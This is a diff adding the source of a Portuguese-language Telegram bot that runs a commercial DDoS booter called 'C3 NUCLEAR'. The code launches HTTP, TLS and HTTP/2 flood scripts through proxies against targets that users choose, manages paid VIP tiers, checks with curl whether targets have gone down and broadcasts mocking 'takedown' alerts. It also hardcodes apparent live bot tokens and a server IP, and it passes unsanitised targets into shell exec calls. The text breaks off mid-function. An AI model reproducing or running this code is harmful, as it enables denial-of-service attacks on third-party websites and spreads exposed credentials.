@@ -1,0 +1,2376 @@
+const { Telegraf, Markup } = require('telegraf');
+const { spawn, exec } = require('child_process');
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+const { createCanvas } = require('canvas');
+const os = require('os');
+
+
+const BOT_TOKEN = '8556952398:AAHBh-w92qF-28OrgGENRcvldlRMN11KRbQ';
+const ADMIN_BOT_TOKEN = '8518145104:AAEm35zFbEgcDPW7rwx3m7vuR4bOgmz5XqM';
+const DONO_ID = '7963749932';
+const PROXY_FILE = 'proxy.txt';
+const QUEDA_CHANNEL_ID = '-1003607776210';
+const API_URL = 'http://103.90.161.181:3333/api.php';
+const API_KEYS_FILE = '/root/botc3/keys.json';
+const VIP_FILE = '/root/botc3/vips.json';
+const CAPTCHA_INTERVAL = 2 * 60 * 60 * 1000;
+const DEFAULT_CONFIG_FILE = '/root/botc3/default_config.json';
+
+
+const authorizedUsers = new Map();
+const adminList = new Set();
+const blockedTargets = new Set();
+const attackSessions = new Map();
+const activeAttacks = new Map();
+const userAttacks = new Map();
+const panelMessages = new Map();
+const pendingUpdates = new Map();
+const userCooldown = new Map();
+const attackedTargets = new Map();
+const apiKeys = new Map();
+const userCaptcha = new Map();
+const userAttackHistory = new Map();
+const vipUsers = new Map();
+let defaultConfig = { simultaneous: 1, maxTime: 30, expires_at: 0 };
+
+
+const USERS_FILE = '/root/botc3/usuarios_liberados.json';
+const BLOCKED_FILE = '/root/botc3/alvos_bloqueados.json';
+const STATS_FILE = '/root/botc3/stats.json';
+const ATTACK_HISTORY_FILE = '/root/botc3/attack_history.json';
+const ADMINS_FILE = '/root/botc3/admins.json';
+
+
+const bot = new Telegraf(BOT_TOKEN);
+const adminBot = new Telegraf(ADMIN_BOT_TOKEN);
+
+
+const GLOBAL_MAX_RPS = 9999;
+const GLOBAL_MAX_THREADS = 9999;
+const GLOBAL_MAX_TIME = 999999;
+const UPDATE_INTERVAL = 2000;
+const FREE_COOLDOWN = 200;
+const FIXED_RPS = 6;
+const FIXED_THREADS = 2;
+
+
+let globalStats = { totalQuedas: 11843, nodesAtivos: 334 };
+
+
+const ZOMBARIA_MESSAGES = [
+    "Mais um alvo neutralizado com sucesso.",
+    "O alvo nao resistiu ao nosso poder de fogo.",
+    "Inimigo abatido. Missao cumprida.",
+    "Derrubado como um castelo de cartas.",
+    "O silencio no servidor inimigo e ensurdecedor.",
+    "Alvo eliminado. Que venha o proximo.",
+    "A bandeira branca foi hasteada. Alvo offline.",
+    "Mais uma vitima do arsenal C3 NUCLEAR.",
+    "O servidor deles foi de arrasta pra cima.",
+    "404 - Site nao encontrado. Literalmente."
+];
+
+
+const OJIVAS = {
+    'GPZ_KILL': { script: 'gpzkill.js', emoji: '⚡', nome: 'KILL' },
+    'GPZ_AR': { script: 'ar.js', emoji: '🎯', nome: 'GPZ-AR' },
+    'GPZ_WX': { script: 'gpzwx.js', emoji: '🌀', nome: 'WX' },
+    'GPZ_TLS': { script: 'tls.js', emoji: '🔒', nome: 'TLS' },
+    'GPZ_TLS1': { script: 'tls1.js', emoji: '🔐', nome: 'TLS1' },
+    'GPZ_HTTP': { script: 'http.js', emoji: '☢️', nome: 'HTTP' },
+    'GPZ_FLOODER': { script: 'flooder.js', emoji: '🌊', nome: 'FLOODER' },
+    'GPZ_C3': { script: 'c3.js', emoji: '🔥', nome: 'C3' },
+    'GPZ_H2': { script: 'c4.js', emoji: '💀', nome: 'H2' },
+    'GPZ_H2MONARCH': { script: 'h2monarch.js', emoji: '🚀', nome: 'H2-MONARCH' }
+};
+
+
+function isAdmin(userId) {
+    const id = userId.toString();
+    return id === DONO_ID || adminList.has(id);
+}
+
+function isDono(userId) {
+    return userId.toString() === DONO_ID;
+}
+
+function escapeMarkdown(text) {
+    if (!text) return '';
+    return String(text).replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
+
+function formatTimeAgo(timestamp) {
+    const now = Date.now();
+    const diff = now - timestamp;
+    const seconds = Math.floor(diff / 1000);
+    const minutes = Math.floor(seconds / 60);
+    const hours = Math.floor(minutes / 60);
+    const days = Math.floor(hours / 24);
+    
+    if (days > 0) return days + 'd atras';
+    if (hours > 0) return hours + 'h atras';
+    if (minutes > 0) return minutes + 'min atras';
+    return seconds + 's atras';
+}
+
+function parseDuration(durationStr) {
+    const str = durationStr.toLowerCase();
+    let seconds = 0;
+    let text = '';
+    
+    if (str.endsWith('d')) {
+        const val = parseInt(str);
+        if (isNaN(val) || val < 1) return null;
+        seconds = val * 86400;
+        text = val + ' dia(s)';
+    } else if (str.endsWith('h')) {
+        const val = parseInt(str);
+        if (isNaN(val) || val < 1) return null;
+        seconds = val * 3600;
+        text = val + ' hora(s)';
+    } else if (str.endsWith('m')) {
+        const val = parseInt(str);
+        if (isNaN(val) || val < 1) return null;
+        seconds = val * 60;
+        text = val + ' minuto(s)';
+    } else {
+        return null;
+    }
+    
+    return { seconds, text };
+}
+
+
+function loadData() {
+    try {
+        if (fs.existsSync(USERS_FILE)) {
+            const users = JSON.parse(fs.readFileSync(USERS_FILE, 'utf8'));
+            Object.entries(users).forEach(([id, data]) => {
+                authorizedUsers.set(id, { ...data, currentAttacks: data.currentAttacks || 0 });
+            });
+        }
+        if (fs.existsSync(BLOCKED_FILE)) {
+            const targets = JSON.parse(fs.readFileSync(BLOCKED_FILE, 'utf8'));
+            targets.forEach(t => blockedTargets.add(t));
+        }
+        if (fs.existsSync(STATS_FILE)) {
+            globalStats = JSON.parse(fs.readFileSync(STATS_FILE, 'utf8'));
+        }
+        if (fs.existsSync(ADMINS_FILE)) {
+            const admins = JSON.parse(fs.readFileSync(ADMINS_FILE, 'utf8'));
+            adminList.clear();
+            admins.forEach(id => adminList.add(id.toString()));
+        }
+        if (fs.existsSync(VIP_FILE)) {
+            const vips = JSON.parse(fs.readFileSync(VIP_FILE, 'utf8'));
+            vipUsers.clear();
+            Object.entries(vips).forEach(([id, data]) => {
+                vipUsers.set(id, data);
+            });
+        }
+        if (fs.existsSync(API_KEYS_FILE)) {
+            const keys = JSON.parse(fs.readFileSync(API_KEYS_FILE, 'utf8'));
+            apiKeys.clear();
+            Object.entries(keys).forEach(([key, data]) => {
+                apiKeys.set(key, data);
+            });
+        }
+        if (fs.existsSync(ATTACK_HISTORY_FILE)) {
+            const history = JSON.parse(fs.readFileSync(ATTACK_HISTORY_FILE, 'utf8'));
+            Object.entries(history).forEach(([userId, data]) => {
+                userAttackHistory.set(userId, data);
+            });
+        }
+        if (fs.existsSync(DEFAULT_CONFIG_FILE)) {
+            defaultConfig = JSON.parse(fs.readFileSync(DEFAULT_CONFIG_FILE, 'utf8'));
+        }
+    } catch(e) { console.error('ERRO AO CARREGAR:', e); }
+    
+    adminList.add(DONO_ID);
+    saveAdmins();
+    
+    if (!authorizedUsers.has(DONO_ID)) {
+        authorizedUsers.set(DONO_ID, { 
+            limit: 999, currentAttacks: 0, maxTime: GLOBAL_MAX_TIME,
+            maxRps: GLOBAL_MAX_RPS, maxThreads: GLOBAL_MAX_THREADS, simultaneousLimit: 999,
+            patente: 'DONO', plano: 'VITALICIO', vip: true,
+            total_attacks: 0, total_quedas: 0,
+            first_name: 'DONO', username: 'dono'
+        });
+        saveUsers();
+    }
+}
+
+function saveUsers() {
+    const users = {};
+    authorizedUsers.forEach((v, k) => { users[k] = v; });
+    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
+}
+
+function saveBlocked() {
+    fs.writeFileSync(BLOCKED_FILE, JSON.stringify([...blockedTargets], null, 2));
+}
+
+function saveStats() {
+    fs.writeFileSync(STATS_FILE, JSON.stringify(globalStats, null, 2));
+}
+
+function saveAdmins() {
+    const admins = Array.from(adminList);
+    fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
+}
+
+function saveVips() {
+    const vips = {};
+    vipUsers.forEach((v, k) => { vips[k] = v; });
+    fs.writeFileSync(VIP_FILE, JSON.stringify(vips, null, 2));
+}
+
+function saveApiKeys() {
+    const keys = {};
+    apiKeys.forEach((v, k) => { keys[k] = v; });
+    fs.writeFileSync(API_KEYS_FILE, JSON.stringify(keys, null, 2));
+}
+
+function saveAttackHistory() {
+    const history = {};
+    userAttackHistory.forEach((v, k) => { history[k] = v; });
+    fs.writeFileSync(ATTACK_HISTORY_FILE, JSON.stringify(history, null, 2));
+}
+
+function saveDefaultConfig() {
+    fs.writeFileSync(DEFAULT_CONFIG_FILE, JSON.stringify(defaultConfig, null, 2));
+}
+
+loadData();
+
+
+function checkVipExpiration(userId) {
+    const vipData = vipUsers.get(userId);
+    if (!vipData) return false;
+    
+    if (vipData.expires_at && Date.now() > vipData.expires_at) {
+        vipUsers.delete(userId);
+        saveVips();
+        
+        const user = authorizedUsers.get(userId);
+        if (user) {
+            user.vip = false;
+            user.patente = 'PADRAO';
+            user.plano = 'GRATUITO';
+            user.simultaneousLimit = 1;
+            user.maxTime = 30;
+            user.limit = 1;
+            saveUsers();
+        }
+        return false;
+    }
+    
+    return true;
+}
+
+function getVipRemaining(userId) {
+    const vipData = vipUsers.get(userId);
+    if (!vipData || !vipData.expires_at) return 0;
+    return Math.max(0, vipData.expires_at - Date.now());
+}
+
+function formatVipRemaining(ms) {
+    const seconds = Math.floor(ms / 1000);
+    const days = Math.floor(seconds / 86400);
+    const hours = Math.floor((seconds % 86400) / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    
+    if (days > 0) return `${days}d ${hours}h`;
+    if (hours > 0) return `${hours}h ${minutes}m`;
+    return `${minutes}m`;
+}
+
+
+function checkDefaultConfigExpiration() {
+    if (defaultConfig.expires_at > 0 && Date.now() > defaultConfig.expires_at) {
+        defaultConfig = { simultaneous: 1, maxTime: 30, expires_at: 0 };
+        saveDefaultConfig();
+        
+        for (const [id, user] of authorizedUsers) {
+            if (!isAdmin(id) && !user.vip) {
+                user.simultaneousLimit = 1;
+                user.maxTime = 30;
+                user.limit = 1;
+                user.patente = 'PADRAO';
+                user.plano = 'GRATUITO';
+            }
+        }
+        saveUsers();
+        return false;
+    }
+    return true;
+}
+
+
+function checkSiteWithCurl(target) {
+    return new Promise((resolve) => {
+        const url = target.startsWith('http') ? target : `https://${target}`;
+        
+        exec(`curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "${url}"`, (error, stdout, stderr) => {
+            const httpCode = stdout.trim();
+            
+            if (error || httpCode === '000' || httpCode === '522' || httpCode === '524' || httpCode === '502' || httpCode === '503' || httpCode === '504') {
+                let errorMsg = '';
+                if (httpCode === '522') errorMsg = 'Connection timed out';
+                else if (httpCode === '524') errorMsg = 'Timeout';
+                else if (httpCode === '502') errorMsg = 'Bad Gateway';
+                else if (httpCode === '503') errorMsg = 'Service Unavailable';
+                else if (httpCode === '504') errorMsg = 'Gateway Timeout';
+                else if (httpCode === '000') errorMsg = 'Sem resposta';
+                else errorMsg = stderr || 'Erro desconhecido';
+                
+                resolve({
+                    online: false,
+                    status: '💀 MORTO',
+                    error: `Erro: ${httpCode} - ${errorMsg}`,
+                    httpCode: httpCode
+                });
+            } else if (httpCode >= 200 && httpCode < 400) {
+                resolve({
+                    online: true,
+                    status: '🟢 ONLINE',
+                    error: null,
+                    httpCode: httpCode
+                });
+            } else {
+                resolve({
+                    online: false,
+                    status: '🔴 MORTO',
+                    error: `Erro: ${httpCode}`,
+                    httpCode: httpCode
+                });
+            }
+        });
+    });
+}
+
+
+function checkTargetStatus(target) {
+    return new Promise((resolve) => {
+        const url = target.startsWith('http') ? target : `https://${target}`;
+        
+        exec(`curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --max-time 10 "${url}"`, (error, stdout, stderr) => {
+            const httpCode = stdout.trim();
+            
+            if (error || httpCode === '000' || httpCode === '522' || httpCode === '524' || httpCode === '502' || httpCode === '503' || httpCode === '504') {
+                let errorMsg = '';
+                if (httpCode === '522') errorMsg = 'Connection timed out';
+                else if (httpCode === '524') errorMsg = 'Timeout';
+                else if (httpCode === '502') errorMsg = 'Bad Gateway';
+                else if (httpCode === '503') errorMsg = 'Service Unavailable';
+                else if (httpCode === '504') errorMsg = 'Gateway Timeout';
+                else if (httpCode === '000') errorMsg = 'Sem resposta';
+                else errorMsg = stderr || 'Erro desconhecido';
+                
+                resolve({
+                    online: false,
+                    status: '💀 MORTO',
+                    error: `Erro: ${httpCode} - ${errorMsg}`,
+                    httpCode: httpCode
+                });
+            } else if (httpCode >= 200 && httpCode < 400) {
+                resolve({
+                    online: true,
+                    status: '🟢 ONLINE',
+                    error: null,
+                    httpCode: httpCode
+                });
+            } else {
+                resolve({
+                    online: false,
+                    status: '🔴 MORTO',
+                    error: `Erro: ${httpCode}`,
+                    httpCode: httpCode
+                });
+            }
+        });
+    });
+}
+
+
+function generateCaptcha() {
+    const code = Math.floor(1000 + Math.random() * 9000).toString();
+    const canvas = createCanvas(500, 200);
+    const ctx = canvas.getContext('2d');
+    
+    const grad = ctx.createLinearGradient(0, 0, 500, 200);
+    grad.addColorStop(0, '#0a0a1a');
+    grad.addColorStop(1, '#1a0a2a');
+    ctx.fillStyle = grad;
+    ctx.fillRect(0, 0, 500, 200);
+    
+    ctx.strokeStyle = '#00ff88';
+    ctx.lineWidth = 2;
+    ctx.shadowColor = '#00ff88';
+    ctx.shadowBlur = 10;
+    ctx.strokeRect(5, 5, 490, 190);
+    ctx.shadowBlur = 0;
+    
+    const digits = code.split('');
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'middle';
+    
+    for (let i = 0; i < digits.length; i++) {
+        const x = 90 + (i * 95);
+        const y = 95 + (Math.random() * 20 - 10);
+        const rot = (Math.random() - 0.5) * 0.2;
+        
+        ctx.save();
+        ctx.translate(x, y);
+        ctx.rotate(rot);
+        ctx.shadowColor = '#00ff88';
+        ctx.shadowBlur = 25;
+        ctx.font = 'bold 72px "Courier New", monospace';
+        ctx.fillStyle = '#00ff88';
+        ctx.fillText(digits[i], 0, 0);
+        ctx.restore();
+    }
+    
+    for (let i = 0; i < 15; i++) {
+        ctx.strokeStyle = '#00ff8822';
+        ctx.lineWidth = 1;
+        ctx.beginPath();
+        ctx.moveTo(Math.random() * 500, Math.random() * 200);
+        ctx.lineTo(Math.random() * 500, Math.random() * 200);
+        ctx.stroke();
+    }
+    
+    ctx.shadowBlur = 0;
+    ctx.font = 'bold 16px "Courier New", monospace';
+    ctx.fillStyle = '#00ff8866';
+    ctx.textAlign = 'center';
+    ctx.textBaseline = 'bottom';
+    ctx.fillText('> DIGITE OS 4 DIGITOS ABAIXO', 250, 190);
+    
+    return { code, buffer: canvas.toBuffer() };
+}
+
+async function showCaptcha(ctx, userId) {
+    const { code, buffer } = generateCaptcha();
+    
+    const allDigits = ['0','1','2','3','4','5','6','7','8','9'];
+    const shuffled = allDigits.sort(() => Math.random() - 0.5);
+    
+    userCaptcha.set(userId, { 
+        code, 
+        expires: Date.now() + 300000, 
+        verified: false, 
+        lastCheck: Date.now(), 
+        userInput: '',
+        attempts: 0
+    });
+    
+    const buttons = [];
+    for (let i = 0; i < 5; i++) {
+        buttons.push([
+            Markup.button.callback(shuffled[i * 2], `captcha_${userId}_${shuffled[i * 2]}`),
+            Markup.button.callback(shuffled[i * 2 + 1], `captcha_${userId}_${shuffled[i * 2 + 1]}`)
+        ]);
+    }
+    buttons.push([
+        Markup.button.callback('🔄 NOVO', `newcaptcha_${userId}`),
+        Markup.button.callback('❌ CANCELAR', `cancel_captcha_${userId}`)
+    ]);
+    
+    await ctx.replyWithPhoto(
+        { source: buffer },
+        { 
+            caption: '🔐 SISTEMA ANTI-ROBO - C3 NUCLEAR\n\n' +
+                     'Clique nos botões para formar o código de 4 dígitos.\n' +
+                     '🕐 Válido por 2 horas.\n\n' +
+                     `📌 Código: ${'⬜'.repeat(4)}`,
+            ...Markup.inlineKeyboard(buttons)
+        }
+    );
+}
+
+
+bot.action(/captcha_(.+)_(.+)/, async (ctx) => {
+    const userId = ctx.match[1];
+    const digit = ctx.match[2];
+    
+    if (ctx.from.id.toString() !== userId) {
+        return ctx.answerCbQuery('❌ Não é para você!', { show_alert: true });
+    }
+    
+    const captchaData = userCaptcha.get(userId);
+    if (!captchaData) {
+        return ctx.answerCbQuery('Sessão expirada! Use /start', { show_alert: true });
+    }
+    
+    if (captchaData.verified) {
+        return ctx.answerCbQuery('✅ Já verificado!', { show_alert: true });
+    }
+    
+    if (!captchaData.userInput) captchaData.userInput = '';
+    captchaData.userInput += digit;
+    
+    const progress = '⬛'.repeat(captchaData.userInput.length) + '⬜'.repeat(4 - captchaData.userInput.length);
+    
+    if (captchaData.userInput.length === 4) {
+        if (captchaData.userInput === captchaData.code) {
+            captchaData.verified = true;
+            captchaData.lastCheck = Date.now();
+            captchaData.userInput = '';
+            userCaptcha.set(userId, captchaData);
+            
+            await ctx.deleteMessage().catch(() => {});
+            await ctx.replyWithHTML(
+                '✅ <b>CAPTCHA RESOLVIDO!</b>\n\n' +
+                '🔓 Acesso liberado por 2 horas.\n' +
+                'Use /start para ver o menu principal.'
+            );
+            await ctx.answerCbQuery('✅ Aprovado!');
+        } else {
+            captchaData.attempts = (captchaData.attempts || 0) + 1;
+            captchaData.userInput = '';
+            userCaptcha.set(userId, captchaData);
+            
+            if (captchaData.attempts >= 5) {
+                await ctx.deleteMessage().catch(() => {});
+                await ctx.reply('❌ Muitas tentativas! Use /start para gerar um novo código.');
+                return ctx.answerCbQuery('❌ Bloqueado! Use /start');
+            }
+            
+            await ctx.answerCbQuery(`❌ Código incorreto! Tentativa ${captchaData.attempts}/5`, { show_alert: true });
+        }
+    } else {
+        userCaptcha.set(userId, captchaData);
+        await ctx.answerCbQuery(`📌 ${captchaData.userInput}${'⬜'.repeat(4 - captchaData.userInput.length)}`);
+    }
+});
+
+bot.action(/newcaptcha_(.+)/, async (ctx) => {
+    const userId = ctx.match[1];
+    if (ctx.from.id.toString() !== userId) {
+        return ctx.answerCbQuery('❌ Não é para você!', { show_alert: true });
+    }
+    await ctx.deleteMessage().catch(() => {});
+    await showCaptcha(ctx, userId);
+    await ctx.answerCbQuery('🔄 Novo código gerado!');
+});
+
+bot.action(/cancel_captcha_(.+)/, async (ctx) => {
+    const userId = ctx.match[1];
+    if (ctx.from.id.toString() !== userId) {
+        return ctx.answerCbQuery('❌ Não é para você!', { show_alert: true });
+    }
+    userCaptcha.delete(userId);
+    await ctx.deleteMessage().catch(() => {});
+    await ctx.reply('❌ CAPTCHA CANCELADO');
+    await ctx.answerCbQuery('Cancelado');
+});
+
+function checkCaptcha(userId) {
+    if (isAdmin(userId)) return true;
+    
+    const captchaData = userCaptcha.get(userId);
+    if (!captchaData || !captchaData.verified) return false;
+    
+    if ((Date.now() - captchaData.lastCheck) > CAPTCHA_INTERVAL) {
+        captchaData.verified = false;
+        userCaptcha.set(userId, captchaData);
+        return false;
+    }
+    
+    return true;
+}
+
+
+function resolveIP(host) {
+    return new Promise((resolve) => {
+        const hostname = host.replace(/^https?:\/\//, '').split('/')[0];
+        exec(`dig +short ${hostname} | head -1`, (error, stdout) => {
+            resolve(error || !stdout.trim() ? 'N/A' : stdout.trim());
+        });
+    });
+}
+
+function normalizeUrl(target) {
+    let url = target.trim();
+    if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        url = 'https://' + url;
+    }
+    return url;
+}
+
+function extractHost(target) {
+    let host = target.trim().toLowerCase();
+    host = host.replace(/^https?:\/\//, '');
+    if (host.includes('/')) host = host.split('/')[0];
+    return host;
+}
+
+function killProcessTree(pid) {
+    try {
+        if (process.platform === 'win32') {
+            spawn('taskkill', ['/pid', pid, '/f', '/t']);
+        } else {
+            process.kill(-pid, 'SIGKILL');
+        }
+    } catch(e) {}
+}
+
+function stopSpecificAttack(attackId) {
+    const attack = activeAttacks.get(attackId);
+    if (!attack || attack.status !== 'EXECUTANDO') return false;
+    if (attack.timerTimeout) clearTimeout(attack.timerTimeout);
+    if (attack.statusInterval) clearInterval(attack.statusInterval);
+    if (attack.processes) {
+        attack.processes.forEach(p => { try { killProcessTree(p.pid); } catch(e) {} });
+    }
+    attack.status = 'PARADO';
+    const user = authorizedUsers.get(attack.userId);
+    if (user) {
+        user.currentAttacks = Math.max(0, user.currentAttacks - attack.simultaneous);
+        saveUsers();
+    }
+    const userTargets = attackedTargets.get(attack.userId);
+    if (userTargets) userTargets.delete(attack.target);
+    const userAttackSet = userAttacks.get(attack.userId);
+    if (userAttackSet) userAttackSet.delete(attackId);
+    if (pendingUpdates.has(attackId)) {
+        clearTimeout(pendingUpdates.get(attackId));
+        pendingUpdates.delete(attackId);
+    }
+    return true;
+}
+
+function stopAllUserAttacks(userId) {
+    const userAttackSet = userAttacks.get(userId);
+    if (!userAttackSet) return 0;
+    let stopped = 0;
+    for (const attackId of userAttackSet) {
+        if (stopSpecificAttack(attackId)) stopped++;
+    }
+    attackedTargets.delete(userId);
+    return stopped;
+}
+
+function registerAttack(userId, attackData) {
+    if (!userAttackHistory.has(userId)) {
+        userAttackHistory.set(userId, {
+            total_attacks: 0,
+            total_quedas: 0,
+            first_name: attackData.first_name || 'Desconhecido',
+            username: attackData.username || '',
+            last_attack: null,
+            attacks: []
+        });
+    }
+    
+    const userHistory = userAttackHistory.get(userId);
+    userHistory.total_attacks++;
+    userHistory.first_name = attackData.first_name || userHistory.first_name;
+    userHistory.username = attackData.username || userHistory.username;
+    userHistory.last_attack = Date.now();
+    
+    userHistory.attacks.unshift({
+        target: attackData.target,
+        method: attackData.method,
+        time: attackData.time,
+        simultaneous: attackData.simultaneous,
+        timestamp: Date.now(),
+        result: attackData.result || 'EXECUTADO'
+    });
+    
+    if (userHistory.attacks.length > 50) {
+        userHistory.attacks = userHistory.attacks.slice(0, 50);
+    }
+    
+    if (attackData.result === 'QUEDA') {
+        userHistory.total_quedas++;
+    }
+    
+    const user = authorizedUsers.get(userId);
+    if (user) {
+        user.total_attacks = userHistory.total_attacks;
+        user.total_quedas = userHistory.total_quedas;
+    }
+    
+    saveAttackHistory();
+    saveUsers();
+}
+
+async function sendLogToAdmin(message) {
+    try {
+        await adminBot.telegram.sendMessage(DONO_ID, message);
+        for (const adminId of adminList) {
+            if (adminId !== DONO_ID) {
+                try {
+                    await adminBot.telegram.sendMessage(adminId, message);
+                } catch(e) {}
+            }
+        }
+    } catch(e) {}
+}
+
+async function sendDropAlert(attack, dropTime, errorMsg) {
+    const msg = ZOMBARIA_MESSAGES[Math.floor(Math.random() * ZOMBARIA_MESSAGES.length)];
+    try {
+        await bot.telegram.sendMessage(QUEDA_CHANNEL_ID,
+            '🏴 OJIVA ' + attack.method + ' CONFIRMA QUEDA\n' +
+            '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
+            msg + '\n\n' +
+            '🎯 Alvo: ' + attack.target + '\n' +
+            '⏱️ Tempo: ' + dropTime + 's\n' +
+            '⚙️ Ojiva: ' + attack.method + '\n' +
+            '👤 Operador: ' + (attack.firstName || 'Desconhecido') + '\n' +
+            (errorMsg ? '❌ Erro: ' + errorMsg + '\n' : '') +
+            '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n' +
+            'Threads: ' + FIXED_THREADS + ' | RPS: ' + FIXED_RPS
+        );
+    } catch(e) {}
+}
+
+async function criarPainel(ctx, attack) {
+    const msg = await ctx.reply(
+        '❖ ── ✦ ── MONITOR DE ANIQUILACAO ── ✦ ── ❖\n' +
+        '🎯 Alvo: ' + attack.target + '\n' +
+        '📡 Status: ' + attack.siteStatus + '\n' +
+        (attack.errorMsg ? '❌ ' + attack.errorMsg + '\n' : '') +
+        '🚀 Ojiva: ' + attack.method + '\n' +
+        '🔄 Simul: ' + attack.simultaneous + '\n' +
+        '⚡ RPS: ' + FIXED_RPS + ' | Threads: ' + FIXED_THREADS + '\n' +
+        '⏳ Restam: ' + attack.time + 's\n' +
+        '┠ ──────────────────────────────────────\n' +
+        '📉 Progresso: [ ░░░░░░░░░░░░░░░ ] 0%',
+        Markup.inlineKeyboard([
+            [Markup.button.callback('🛑 ABORTAR', `stop_attack_${attack.id}`)]
+        ])
+    );
+    panelMessages.set(attack.id, { msgId: msg.message_id, chatId: ctx.chat.id });
+    setTimeout(() => schedulePanelUpdate(attack.id), UPDATE_INTERVAL);
+}
+
+function schedulePanelUpdate(attackId) {
+    if (pendingUpdates.has(attackId)) return;
+    pendingUpdates.set(attackId, setTimeout(() => {
+        updatePanel(attackId);
+        pendingUpdates.delete(attackId);
+    }, UPDATE_INTERVAL));
+}
+
+async function updatePanel(attackId) {
+    const attack = activeAttacks.get(attackId);
+    if (!attack) return;
+    const panel = panelMessages.get(attackId);
+    if (!panel) return;
+    
+    const elapsed = Math.floor((Date.now() - attack.startTime) / 1000);
+    const remaining = Math.max(0, attack.time - elapsed);
+    const percent = Math.min(100, Math.floor((elapsed / attack.time) * 100));
+    const barLen = 15;
+    const filled = Math.floor((percent / 100) * barLen);
+    const bar = '▓'.repeat(filled) + '░'.repeat(barLen - filled);
+    
+    if (attack.status !== 'EXECUTANDO' || elapsed >= attack.time) {
+        const finalCheck = await checkSiteWithCurl(attack.target);
+        if (!finalCheck.online) {
+            attack.finalStatus = finalCheck.status;
+            attack.finalError = finalCheck.error;
+            globalStats.totalQuedas++;
+            saveStats();
+        } else {
+            attack.finalStatus = '🟢 ONLINE';
+            attack.finalError = null;
+        }
+        
+        const userTargets = attackedTargets.get(attack.userId);
+        if (userTargets) userTargets.delete(attack.target);
+        try {
+            await bot.telegram.editMessageText(panel.chatId, panel.msgId, null,
+                '❖ ── ✦ ── OPERACAO FINALIZADA ── ✦ ── ❖\n' +
+                '🎯 Alvo: ' + attack.target + '\n' +
+                '📡 Status: ' + (attack.finalStatus || '🟢 ONLINE') + '\n' +
+                (attack.finalError ? '❌ ' + attack.finalError + '\n' : '') +
+                '🚀 Ojiva: ' + attack.method + '\n' +
+                '⏱️ Duracao: ' + elapsed + 's\n' +
+                '🔄 Simul: ' + attack.simultaneous + '\n' +
+                '❖ ────────────────────────────────────── ❖'
+            ).catch(() => {});
+        } catch(e) {}
+        panelMessages.delete(attackId);
+        activeAttacks.delete(attackId);
+        return;
+    }
+    
+    const status = await checkSiteWithCurl(attack.target);
+    attack.siteStatus = status.status;
+    attack.errorMsg = status.error;
+    
+    if (!status.online && !attack.wasOffline) {
+        attack.wasOffline = true;
+        attack.dropTime = Math.floor((Date.now() - attack.startTime) / 1000);
+        
+        const userHistory = userAttackHistory.get(attack.userId);
+        if (userHistory && userHistory.attacks.length > 0) {
+            userHistory.attacks[0].result = 'QUEDA';
+            userHistory.attacks[0].dropTime = attack.dropTime;
+            userHistory.total_quedas++;
+            const u = authorizedUsers.get(attack.userId);
+            if (u) u.total_quedas = userHistory.total_quedas;
+            saveAttackHistory();
+            saveUsers();
+        }
+        
+        await sendDropAlert(attack, attack.dropTime, status.error);
+    }
+    
+    try {
+        await bot.telegram.editMessageText(panel.chatId, panel.msgId, null,
+            '❖ ── ✦ ── MONITOR DE ANIQUILACAO ── ✦ ── ❖\n' +
+            '🎯 Alvo: ' + attack.target + '\n' +
+            '📡 Status: ' + (attack.siteStatus || '🟢 ONLINE') + '\n' +
+            (attack.errorMsg ? '❌ ' + attack.errorMsg + '\n' : '') +
+            '🚀 Ojiva: ' + attack.method + '\n' +
+            '🔄 Simul: ' + attack.simultaneous + '\n' +
+            '⚡ RPS: ' + FIXED_RPS + ' | Threads: ' + FIXED_THREADS + '\n' +
+            '⏳ Restam: ' + remaining + 's\n' +
+            '┠ ──────────────────────────────────────\n' +
+            '📉 [ ' + bar + ' ] ' + percent + '%',
+            Markup.inlineKeyboard([
+                [Markup.button.callback('🛑 ABORTAR', `stop_attack_${attackId}`)]
+            ])
+        ).catch(() => {});
+        if (attack.status === 'EXECUTANDO') {
+            setTimeout(() => schedulePanelUpdate(attackId), UPDATE_INTERVAL);
+        }
+    } catch(e) {}
+}
+
+async function iniciarAtaques(ctx, userId, session, ojiva) {
+    const { target, time, sim, firstName, username } = session;
+    const user = authorizedUsers.get(userId);
+    const scriptPath = path.resolve(ojiva.script);
+    
+    if (!fs.existsSync(scriptPath)) {
+        return ctx.reply('SCRIPT ' + ojiva.script + ' NAO ENCONTRADO');
+    }
+    
+    user.currentAttacks += sim;
+    saveUsers();
+    if (!attackedTargets.has(userId)) attackedTargets.set(userId, new Set());
+    attackedTargets.get(userId).add(target);
+    if (!user.vip) userCooldown.set(userId, Date.now() + (FREE_COOLDOWN * 1000));
+    
+    registerAttack(userId, {
+        target: target,
+        method: ojiva.nome,
+        time: time,
+        simultaneous: sim,
+        first_name: firstName,
+        username: username,
+        result: 'EXECUTANDO'
+    });
+    
+    const attackId = Date.now() + Math.floor(Math.random() * 1000);
+    const attack = {
+        id: attackId, userId, target, time, simultaneous: sim,
+        method: ojiva.nome, script: ojiva.script,
+        startTime: Date.now(), status: 'EXECUTANDO',
+        processes: [], siteStatus: '🟢 ONLINE', wasOffline: false, dropTime: null,
+        firstName: firstName, username: username, errorMsg: null
+    };
+    
+    const initialStatus = await checkSiteWithCurl(target);
+    attack.siteStatus = initialStatus.status;
+    attack.errorMsg = initialStatus.error;
+    if (!initialStatus.online) { attack.wasOffline = true; attack.dropTime = 0; }
+    
+    activeAttacks.set(attackId, attack);
+    if (!userAttacks.has(userId)) userAttacks.set(userId, new Set());
+    userAttacks.get(userId).add(attackId);
+    
+    await sendLogToAdmin('🆕 NOVO ATAQUE\n👤 ' + firstName + '\n🎯 ' + target + '\n🚀 ' + ojiva.nome + '\n⏱️ ' + time + 's');
+    
+    for (let i = 0; i < sim; i++) {
+        let args = [scriptPath, target, time.toString(), FIXED_RPS.toString(), FIXED_THREADS.toString()];
+        if (fs.existsSync(PROXY_FILE)) args.push(PROXY_FILE);
